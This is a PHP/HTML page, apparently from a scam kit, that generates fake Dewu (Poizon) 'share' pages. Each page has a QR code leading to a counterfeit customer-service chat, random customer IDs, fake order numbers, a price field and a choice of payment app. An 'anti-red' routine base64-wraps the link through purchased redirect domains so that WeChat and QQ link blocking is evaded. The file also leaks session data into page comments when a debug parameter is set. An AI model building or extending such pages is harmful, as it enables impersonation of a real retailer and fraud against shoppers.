<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin(); // 验证登录状态

// 获取当前登录的客服信息
$currentAgent = $_SESSION['username'];

// 生成随机6位客户名称（A-Z, a-z, 0-9）
function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '得物') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();

// 按照格式构建会话ID：a{customer}z-p{agent}s
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '得物');

// 获取当前域名和协议
$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;

// 生成原始客服链接
$originalServiceUrl = $baseUrl . '/' . "ChatDewu" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}

// 生成20位随机订单流水号
function generateOrderNumber($length = 20) {
    $numbers = '0123456789';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $numbers[rand(0, strlen($numbers) - 1)];
    }
    return $randomString;
}

$orderNumber = generateOrderNumber();

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
    <link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/dewu.css">
</head>
<body>
	<div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">

				<div class="form-container">
					<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
					<div class="form-row">
						<label>价格</label>
						<input type="text" id="price-input" placeholder="输入金额">
					</div>
					<div class="form-row">
						<label>扫码</label>
						<select id="pay-select">
							<option value="微信">微信(推荐)</option>
							<option value="支付宝">支付宝</option>
							<option value="QQ">QQ</option>
							<option value="百度">百度</option>
							<option value="浏览器">浏览器</option>
						</select>
					</div>
					<div class="form-row random-image-row">
						<label>商品图</label>
						<button id="random-image-btn" class="random-image-btn">随机图片</button>
					</div>
				</div>
				<!-- 预览区域开始 -->
				<div class="XE-main">
					<div class="XEdu-body">
						<div class="XEdu-container">
							<!-- 主卡片 -->
							<div class="XEdu-main-card">
								<!-- 商品预览 -->
								<div class="XEdu-product-preview">
									<div class="XEdu-product-tag">潮流尖货</div>
									<div class="XEdu-product-image" id="product-image" style="
                    background-image: url('https://cdn.poizon.com/pro-img/cut-img/20250825/b6e5a9430fa3445888fbec0cb541fc8b.jpg');
                    background-size: cover;
                    background-position: center;
                    background-repeat: no-repeat;
                ">
									</div>
								</div>
								<!-- 内容区域 -->
								<div class="XEdu-content">
									<h1 class="XEdu-share-title"><span style="color:#01c2c3;">发现限定</span>潮流单品</h1>
									<p class="XEdu-share-desc">分享这个独一无二的潮流发现，邀请好友一起探索得物上的潮流尖货与独家限定</p>
									<!-- 二维码区域 -->
									<div class="XEdu-qrcode-section">
										<div class="XEdu-qrcode-container">
											<div class="XEdu-qrcode" id="XEdu-qrcode">
											</div>
											<div class="XEdu-qr-logo">
												<svg t="1768754985548" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5310" width="24" height="24">
													<path d="M960 797.248V226.784C960 137.248 886.752 64 797.216 64H226.784C137.248 64 64 137.248 64 226.784v570.464c0 88.64 71.808 161.344 160.16 162.752h575.68C888.16 958.592 960 885.92 960 797.248" fill="#040000" p-id="5311"></path>
													<path
														d="M194.592 354.656v-32.864L128 320l0.928 17.344 0.928 17.312h64.704z m175.392 147.936c84.256-0.064 111.68-0.992 113.472-3.872 1.184-1.728 1.888-40.128 1.984-80.416v-24.096c-0.096-34.304-0.64-64.832-1.664-68.8-1.12-4.32-8.128-4.992-92.864-5.12h-157.76v106.624c0.128 58.368 1.152 75.68 3.968 75.68zM612.352 706.88c0.256 30.976 2.784 30.08 28.032 28.224l13.568-0.896 0.928-41.248c0.608-38.56 1.216-40.96 6.784-40.96 5.216 0 6.144-2.08 6.144-14.912 0-8.384 0.32-15.84 0.96-17.344 0.288-1.184-2.496-3.296-6.208-5.088l-7.072-2.976V458.368c0.16-65.408 0.896-74.112 4.608-75.2l0.8-0.096h0.448c6.784 0 8.96-4.192 8-16.448-0.32-5.088-0.896-11.968-0.896-15.84-0.32-4.48-2.496-6.592-6.496-6.592-4.928 0-6.144-2.368-7.072-11.328l-0.96-11.072-18.464-0.896c-10.496-0.608-19.744 0-20.96 1.184-1.248 1.216-2.176 6.592-2.176 11.68v9.536l-18.176 0.64c-16.96 0.576-18.496 0-19.424-6.304-0.96-6.272-2.464-6.88-20.96-6.88h-20.064v245.056l20.992 0.896 20.64 0.896V383.04h36.992v229.824l-39.136 0.896-39.488 0.896-0.896 16.16c-0.64 11.04 0.32 17.024 3.072 18.528 2.144 1.472 20.352 2.688 40.384 2.688h36.064zM836.8 735.264c22.464-0.096 37.76-0.96 41.6-2.24l1.856-0.704 1.76-0.736a25.152 25.152 0 0 0 0.8-0.384l1.568-0.832c9.888-6.048 11.52-22.496 11.616-126.816v-34.016c0-12.256 0-25.472-0.064-39.744-0.32-98.336-1.536-180.192-2.752-182.304-1.856-2.688-20.032-3.584-72.16-3.296-38.528 0-73.056-0.576-77.376-1.792-5.856-1.184-8-3.872-8.64-11.04-0.896-9.568-0.896-9.568-20.32-10.464-13.568-0.608-19.744 0.32-20.672 2.976-0.544 1.28-0.896 28.544-0.992 69.376l-0.032 14.08v55.68c0.064 8.544 0.064 17.28 0.096 26.144l0.96 161.376h40.064l0.896-133.888 0.64-133.568h36.992l0.64 133.568 0.896 133.888h40.064l0.96-133.888 0.608-133.568H852.8v173.44c-0.128 99.776-1.088 134.24-3.712 136.768-2.464 2.368-16.32 3.584-41.6 3.584-31.168 0-38.56-0.896-39.776-4.48-1.536-3.616-8.96-4.48-38.56-4.48h-4.544c-17.92 0.128-32.096 0.96-31.808 2.08 0 1.248 8.768 8.512 20.8 17.632l7.552 5.664 28.352 20.928 60.128 0.896 14.208 0.16zM442.752 395.008H276.288V356.16h166.464v38.848z m-248.16 339.2V396.512l-31.136-0.896c-16.96-0.32-31.744 0-32.96 1.184-1.28 1.216-2.176 9.28-2.176 18.24v15.84h24.64l0.64 151.52 0.928 151.808h40.032z m248.16-267.488H276.288v-35.84h166.464v35.84zM292.64 736l81.376-0.896 81.696-0.896 7.392-8.384c6.784-7.744 7.392-10.752 7.392-41.216V679.2c0.064-25.344 0.704-27.2 6.176-27.2 5.248 0 6.176-2.08 6.176-14.912 0-8.384 0.32-15.84 0.32-17.344 0.32-1.184-2.496-3.296-6.176-5.088-5.568-2.368-6.496-5.376-6.496-20 0-15.264 0.64-17.344 6.176-17.344 3.392 0 6.176-0.896 6.464-2.4 2.496-17.024 2.176-29.28-0.608-32.576-2.784-2.976-26.816-3.872-124.544-3.872H350.4c-62.88 0.064-114.24 0.96-115.104 2.08-1.248 0.896-2.176 9.856-2.176 19.424v17.344h194.24v35.84l-96.192 0.64-96.512 0.864v35.872l96.512 0.896 96.48 0.608-0.928 21.792-0.896 21.536-58.272 0.896c-49.952 0.608-58.88 0-61.056-3.904-2.144-3.584-9.568-4.48-37.92-4.48l-4.8 0.032c-17.184 0.128-30.656 0.96-30.656 1.76 0 2.4 1.856 4.192 33.92 27.52L292.64 736z"
														fill="#FFFFFF" p-id="5312"></path>
												</svg>
											</div>
										</div>
										<p class="XEdu-qrcode-tip">打开<span class="XEdu-highlight" id="app-name">得物App</span>扫描二维码<br>立即联系在线客服</p>
									</div>
								<!-- 底部信息 -->
<div class="XEdu-footer">
	<div class="XEdu-footer-item">
		<i class="bi bi-shield-check"></i>
		<span>正品保障</span>
	</div>
	<div class="XEdu-footer-item">
		<i class="bi bi-truck"></i>
		<span>闪电发货</span>
	</div>
	<div class="XEdu-footer-item">
		<i class="bi bi-award-fill"></i>
		<span>专业鉴别</span>
	</div>
</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- 预览区域结束 -->
			</div>
		</div>
	</div>
	<script src="/assets/qrcode.min.js"></script>
	<script src="/assets/qrcode-helper.js"></script>
	<script>
		// 生成二维码 - 使用PHP动态生成的链接
		var qrCodeUrl = "<?php echo $serviceUrl; ?>";

		// 商品图片数组 - 20个示例图片链接
		const productImages = [
		    'https://cdn.poizon.com/pro-img/cut-img/20250825/b6e5a9430fa3445888fbec0cb541fc8b.jpg',
		    'https://images.unsplash.com/photo-1542291026-7eec264c27ff?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1606107557195-0e29a4b5b4aa?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1549298916-b41d501d3772?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1600185365483-26d7a4cc7519?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1515955656352-a1fa3ffcd111?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1491553895911-0055eca6402d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1576566588028-4147f3842f27?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1525966222134-fcfa99b8ae77?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1543508282-6319a3e2621f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1523275335684-37898b6baf30?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1512374382149-233c42b6a83b?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1556306535-0f09a537f0a3?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1516478177764-9fe5bd7e9717?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1505740106531-4243f3831c78?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1551028719-00167b16eac5?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80',
		    'https://images.unsplash.com/photo-1556905055-8f358a7a47b2?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'
		];

		document.addEventListener('DOMContentLoaded', function() {
		    // 生成二维码到 XEdu-qrcode
		    if (document.getElementById("XEdu-qrcode")) {
		        try {
		            new QRCode(document.getElementById("XEdu-qrcode"), {
		                text: qrCodeUrl,
		                width: getQRSize(qrCodeUrl, 180),
		                height: getQRSize(qrCodeUrl, 180),
		                colorDark: "#000000",
		                colorLight: "#ffffff",
		                correctLevel: getQRCorrectLevel(qrCodeUrl)
		            });
		        } catch(e) {
		            console.error('QR码生成失败，尝试降级:', e);
		            try {
		                document.getElementById("XEdu-qrcode").innerHTML = '';
		                new QRCode(document.getElementById("XEdu-qrcode"), {
		                    text: qrCodeUrl,
		                    width: 140,
		                    height: 140,
		                    colorDark: "#000000",
		                    colorLight: "#ffffff",
		                    correctLevel: QRCode.CorrectLevel.L
		                });
		            } catch(e2) {
		                document.getElementById("XEdu-qrcode").innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:180px;height:180px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
		            }
		        }
		    }
		    
		    // 随机图片功能
		    const randomImageBtn = document.getElementById('random-image-btn');
		    const productImage = document.getElementById('product-image');
		    
		    if (randomImageBtn && productImage) {
		        // 随机选择图片函数
		        function getRandomImage() {
		            const randomIndex = Math.floor(Math.random() * productImages.length);
		            return productImages[randomIndex];
		        }
		        
		        // 设置随机图片
		        randomImageBtn.addEventListener('click', function() {
		            const randomImageUrl = getRandomImage();
		            productImage.style.backgroundImage = `url('${randomImageUrl}')`;
		            
		            // 显示提示
		            showCopyToast('商品图片已随机更换');
		        });
		    }
		    
		    // 扫码方式选择功能
		    const paySelect = document.getElementById('pay-select');
		    const appNameSpan = document.getElementById('app-name');
		    
		    if (paySelect && appNameSpan) {
		        paySelect.addEventListener('change', function() {
		            const selectedValue = this.value;
		            
		            // 根据选择的值更新App名称
		            switch(selectedValue) {
		                case '微信':
		                    appNameSpan.textContent = '微信';
		                    break;
		                case '支付宝':
		                    appNameSpan.textContent = '支付宝';
		                    break;
		                case 'QQ':
		                    appNameSpan.textContent = 'QQ';
		                    break;
		                case '百度':
		                    appNameSpan.textContent = '百度';
		                    break;
		                case '浏览器':
		                    appNameSpan.textContent = '浏览器';
		                    break;
		                default:
		                    appNameSpan.textContent = '得物App';
		            }
		        });
		    }
		    
		    
		    // 价格输入监听
		    const priceInput = document.getElementById('price-input');
		    if (priceInput) {
		        priceInput.addEventListener('input', function() {
		            // 确保只输入数字和小数点
		            this.value = this.value.replace(/[^\d.]/g, '');
		            
		            // 最多只能有一个小数点
		            const parts = this.value.split('.');
		            if (parts.length > 2) {
		                this.value = parts[0] + '.' + parts.slice(1).join('');
		            }
		            
		            // 小数点后最多两位
		            if (parts.length === 2 && parts[1].length > 2) {
		                this.value = parts[0] + '.' + parts[1].substring(0, 2);
		            }
		        });
		    }
		});
		
		// 显示复制成功提示
		function showCopyToast(message) {
		    const copyToast = document.getElementById('copyToast');
		    if (!copyToast) return;
		    
		    const toastMessage = copyToast.querySelector('.toast-message');
		    if (toastMessage) {
		        toastMessage.textContent = message;
		    }
		    
		    copyToast.classList.add('show');
		    
		    setTimeout(() => {
		        copyToast.classList.remove('show');
		    }, 2000);
		}
	</script>
	<script>
    function copyToClipboard(text) {
        return new Promise(function(resolve, reject) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(function() {
                    resolve(true);
                }).catch(function(err) {
                    console.error('复制失败:', err);
                    fallbackCopy(text, resolve, reject);
                });
            } else {
                fallbackCopy(text, resolve, reject);
            }
        }).then(function(success) {
            if (success) {
                showToast('链接已复制到剪贴板！', 'success');
            } else {
                showToast('复制失败，请手动复制', 'error');
            }
        });
    }

    function fallbackCopy(text, resolve, reject) {
        var textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
            var successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            resolve(successful);
        } catch (err) {
            console.error('复制失败:', err);
            document.body.removeChild(textArea);
            resolve(false);
        }
    }

    function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = type === 'error' ? '!' : '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        var copyLinkBtn = document.getElementById('copy-link-btn');
        if (copyLinkBtn) {
            copyLinkBtn.addEventListener('click', function() {
                copyToClipboard(qrCodeUrl);
            });
        }
    });
	</script>
</body>
</html>